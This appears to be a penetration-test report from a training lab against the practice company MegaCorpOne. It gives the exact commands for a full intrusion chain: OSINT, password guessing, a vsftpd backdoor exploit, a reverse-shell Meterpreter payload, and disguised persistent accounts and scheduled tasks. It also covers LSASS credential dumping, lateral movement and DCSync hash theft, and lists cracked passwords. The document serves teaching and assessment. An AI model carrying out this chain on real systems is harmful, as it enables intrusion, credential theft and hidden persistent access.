16.1.2 Using Google Dorking we were able to gather relevant information on MegaCorpOne.
	We found the “Index of /assets” webpage with the below Google search:
		site:megacorpone.com
	The “Index of /assets” webpage provided the below information:
		Web server: Apache 2.4.38
		OS: Debian
		Port: 80
	We found a list of user names and email addresses in the “About Us” webpage with the below Google search:
		site:megacorpone.com intext:email
	We found the below usernames and email addresses:
		Name
		Email
		Joe Sheer
		joe@megacorpone.com
		Tom Hudson
		thudson@megacorpone.com
		Tanya Rivera
		trivera@megacorpone.com
		Matt Smith
		msmith@megacorpone.com
		Mike Carlow
		mcarlow@megacorpone.com
		Alan Grofield
		agrofield@megacorpone.com
	We deduced that the naming convention for emails is the below:
		first initial:last name
	
16.1.3 Using Shodan.io we performed enumeration on the MegaCorpOne domain to obtain information.
	We used the below nslookup command to get MegaCorpOne’s IP address:
		ns lookup www.megacorpone.com
	We found the below IP address with this command:
		149.56.244.87
	We then searched this IP address in Shodan.io which provided the below information:
		Open Ports: 22, 80, 443
		SSH Version: SSH-2.0-OpenSSH_7.9p1 Debian-10+deb10u3
		OS: Debian
		Web Server version: Apache httpd 2.4.38
		Potential Vulnerabilities: 
			CVE-2023-27522
			CVE-2023-25690
			CVE-2022-37436
			CVE-2022-36760
			CVE-2022-31813
			CVE-2022-30556
			CVE-2022-29404
			CVE-2022-28615
			CVE-2022-28614
			CVE-2022-28330
		Server Location: Montréal, Canada

16.1.4 We integrated OSINT technologies using Recon-ng to gain additional information on MegaCorpOne.
	We loaded the hackertarget scanner module by running the below command:
		modules load recon/domains-hosts/hackertarget
	We set the target for Recon-ng to scan with the below command:
		options set SOURCE megacorpone.com
	We then ran a scan to gather information on domain names and hostnames for Megacorpone.
	Next we loaded the reporting module with the below command:
		modules load reporting/html
	We set the CREATOR and CUSTOMER with the below commands:
		options set CREATOR Pentester
		options set CUSTOMER MegaCorpOne
	We then ran the module to generate a report that provided a list of Hosts and their IP addresses for MegaCorpOne.

16.2.1 We were able to log in to vpn.megacorpone.com via Password Guessing using the list of usernames found earlier.
	We then downloaded a shell script titled vpn.sh from the website and changed the permissions to make it executable with the below command:
		chmod +x vpn.sh
	We then ran the shell script and used the same credentials to connect to vpn.megacorpone.com.

16.2.3 We used Zenmap/Nmap to scan MegaCorpOne’s network.
	We performed an intense scan on the below subnet:
		172.22.117.0/24
	We discovered a machine with port 21 open with the below IP address:
		172.22.117.150
	We then targeted this machine with another intense scan using Zenmap and discovered that it was vulnerable to the below backdoor exploit:
		vsFTPd version 2.3.4 backdoor
		CVE: CVE-2011-2523

16.2.4 We used a Python script to exploit a known vulnerability associated with the FTP service on the machine that we discovered on MegaCorpOne’s internal network, Metasploitable2, and gained a reverse shell into the machine.
	Using searchsploit we searched for exploits around the FTP service and found one that is written in Python and allowed us to execute a backdoor.
	We then ran the script with the target machine’s IP address (172.22.117.150) and successfully opened a shell with the below command:
		python usr/share/exploitdb/exploits/unix/remote/49757.py 172.22.117.150

16.3.1 After performing the initial scans on MegaCorpOne’s domain, the below facts were discovered:
	MegaCorpOne’s network consists of primarily Windows machines and has some Linux machines dispersed throughout.
	MegaCorpOne’s firewall rules only allow ports 80, 443 TCP, and port 53 UDP outbound.

16.3.2 We successfully connected to the target machine with the IP address 172.22.117.150 and gained root access using the below backdoor exploit:
	VSFTPD v2.3.4 Backdoor Command Execution
		Exploit: https://www.rapid7.com/db/modules/exploit/unix/ftp/vsftpd_234_backdoor/
		Host IP address: 172.22.117.150
		Port: 21
		Service name: FTP
		Service version: VSFTPD 2.3.4
		Exploit outcome: Success

16.3.3 Using Metasploit, we set up a low-privileged shell and were able to escalate privileges from daemon to root on the remote host.
	We were able to find a file titled adminpassword.txt with the below command:
		find / -type f -iname *password* 2>/dev/null
	This file contained the below credentials:
		msfadmin:cybersecurity
	We then used these credentials to SSH into the remote host with the below command:
		ssh msfadmin@172.22.117.150
	Then, as the user msfadmin, we were able to escalate privileges to root with the below command:
		sudo su

16.4.1 After escalating privileges to root on the remote host, we performed additional enumeration and were able to assemble a list of active users and their passwords.
	We were able to find this list of active users and their password hashes from the shadow file and saved them to a .txt file.
	Using John the Ripper we were able to crack the password hashes from the .txt file which provided us with the below passwords:
		User
		Password
		systemd-ssh
		password
		klog
		123456789
		sys
		batman
		service
		service
		tstark
		Password!

16.4.2 We were able to add another port for the SSH service to listen on and open it on a firewall then made a privileged account so we could SSH to this port which allowed us to re-access the target as needed.
	We edited the SSH config file and added port 10022 then restarted the machine in order to restart the SSH service.
	Then we created a new account, naming it so it appears as though its a service, and added this account to the admin group, see below:
		Account: systemd-ssh
		Password: password
	With this new account we were able to SSH into the target host through the port (10022) that we added to the SSH config file earlier using the below command:
		ssh -p 10022 systemd-ssh@172.22.117.150

17.1.1 We used Zenmap to scan the network searching for Windows machines in order to find additional targets.
	After performing the scan targeting the subnet 172.22.117.0/24 we found 2 Windows machines on the network listed below:
		WinDC01 (172.22.117.10)
		Windows10 (172.22.117.20)
	We were able to identify these machines as the below ports and services were open which indicates a Windows OS:
		445 SMB
		139 RPC/SMB
		88 Kerberos
	We were also able to deduce that the WinDC01 machine is the Domain Controller (DC) as port 88 is always open on the DC due to the way that Kerberos works.

17.1.2 We were able to successfully log into both Windows machines with the Password Spraying technique using the SMB protocol.
	We used Metasploit to load the SMB login module and set module options with the below commands:
		use auxiliary/scanner/smb/smb_login
			set SMBUser tstark
			set SMBPass Password!
			set SMBDomain megacorpone
			set RHOSTS 172.22.117.0/24
	Using the below credentials that we obtained earlier we were able to successfully log in to the Windows10 machine (172.22.117.20) and the WinDC01 machine (172.22.117.10) with the SMBExploit:
		User: tstark
		Password: Password!

17.1.3 We performed LLMNR Spoofing using the Responder tool and were able to obtain another domain user’s credentials then cracked the password hash using John the Ripper.
	We ran Responder with the below command which listened for LLMNR broadcasts from all devices that are on the network:
		sudo responder -I eth1 -v
	We received the username and password hash from the requesting user then copied it into a .txt file and cracked it with John the Ripper, see credentials below:
		Username: pparker
		Password: Spring2021

17.1.4 We were able to run commands on the remote machine utilizing 2 sets of previously obtained credentials and the wmiexec module.
	We loaded the wmiexec module in Metasploit and set module options with the below commands:
		use scanner/smb/impacket/wmiexec
			set RHOSTS 172.22.117.20
			set SMBDomain megacorpone
			set SMBUser tstark
			set SMBPass Password!
			set COMMAND tasklist
	After running the module we were provided with all running services on the device.
	We were also able to obtain the below additional information after changing the COMMAND option in the module:
		set COMMAND systeminfo
			Windows Version: 10.0.19042
			Windows Build Number: 19042
			Processor Architecture: x64
		set COMMAND net session
			The number of users currently logged in (none at the time)
		set COMMAND net share
			Available Shares: C$, IPC$, ADMIN$

17.2.1 Using WMI we were able to deliver and execute a custom payload created using msfvenom to the remote host.
	We generated a Windows Meterpreter payload with the below command:
		msfvenom -p windows/meterpreter/reverse_tcp LHOST=172.22.117.100 LPORT=4444 -f exe > shell.exe
	We then used SMBClient to manipulate and connect to the C drive of the remote Windows machine’s file system over SMB with the below command and using below password:
		smbclient //172.22.117.20/C$ -U megacorpone/tstark
		Password: Password!
	We then uploaded the custom payload to the remote system using the below command:
		put shell.exe
	Then we listened for the payload to execute via Metasploit using exploit/multi/handler module and setting the below module options with the below commands (Note: The -j argument in the run -j command ran the module in the background so we could continue to use Metasploit while it was listening):
		use exploit/multi/handler
			set payload windows/meterpreter/reverse_tcp
			set LHOST 172.22.117.100
			set LPORT 4444
		run -j
	We then loaded the WMI module and set options with the below commands (Note: We set the custom payload created earlier as the command):
		use scanner/smb/impacket/wmiexec
			set SMBPass Password!
			set SMB tstark
			set SMBDomain megacorpone
			set RHOSTS 172.22.117.20
			set COMMAND C:\shell.exe
	We then ran the module, creating an active session, and viewed it, and then selected it with the below commands:
		sessions
		sessions -i 2

17.2.2 We were able to gain full control of the Windows machine by escalating privileges.
	After backgrounding the Meterpreter session, we then loaded the windows/local/persistence_service module and set the session with the below commands:
		use windows/local/persistence_service
			set SESSION 2
	Once we ran the module which uploaded an executable file with a random name and renamed it with a more legitimate appearing title (explorer.exe) we were able to get the user ID with the below command:
		getuid

17.2.3 We were able to create a scheduled task which would execute the custom payload created earlier in order to initiate persistence.
	We then entered a shell session within out active session on the Windows10 machine with the below command:
		shell
	Once in the shell we were able to create a scheduled task that would execute the custom payload at midnight every day wit the below command:
		schtasks /create /f /tn Backdoor /SC ONCE /ST 00:00 /TR "C:\shell.exe"
	We then tested the scheduled task to ensure proper function with the below command:
		schtasks /run /tn Backdoor

17.3.1 We managed to dump credentials that were cached on the Windows10 machine using the kiwi extension in Metasploit.
	We loaded the psexec module and set options in Metasploit with the below commands:
		use exploit/windows/smb/psexec
			set RHOSTS 172.22.117.20
			set SMBUser tstark
			set SMBPass Password!
			set SMBDomain megacorpone
			set LHOST 172.22.117.100
	We then ran the module and then loaded the kiwi extension with the below command:
		load kiwi
	Using the below command we were able to dump all credentials that were cached on the Windows10 machine from LSASS:
		kiwi_cmd lsadump::cache
	This provided password hashes in the MsCacheV2 format which we saved to a .txt file and used John the Ripper to crack with the below command and provided the below credentials:
		john --format=mscash2 hash.txt
			bbanner:Winter2021
			pparker:Spring2021
			tstark:Password!

17.3.2 We were then able to perform lateral movement from the Windows10 to the WINDC01 machine with the credentials previously obtained.
	On the Windows10 machine, we used a SYSTEM level shell and loaded the exploit/windows/local/wmi module, set options, and ran the payload in the background with the below commands:
		use exploit/windows/local/wmi
			set RHOSTS 172.22.117.10
			set SESSION 1
			set SMBDomain megacorpone
			set SMBUser bbanner
			set SMBPass Winter2021
			set LHOST 172.22.117.100
		run -j
	We were able to create a Meterpreter session within the WINDC01 machine by running the WMI exploit from the Windows10 machine.

17.3.3 We were able to create a copy of the NTDS.dit file on the WINDC01 machine and attempted to crack the password hashes.
	After entering a shell within Meterpreter, we view the users on the WINDC01 machine with the below command:
		net users
	We then loaded kiwi and ran the below command on each user within Meterpreter (replacing the <USER NAME> portion with the relevant name):
		dcsync_ntlm <USER NAME>
	We then put each NTLM has in a .txt file and used John the Ripper to crack the passwords with the below command:
		john hash2.txt --format=NT

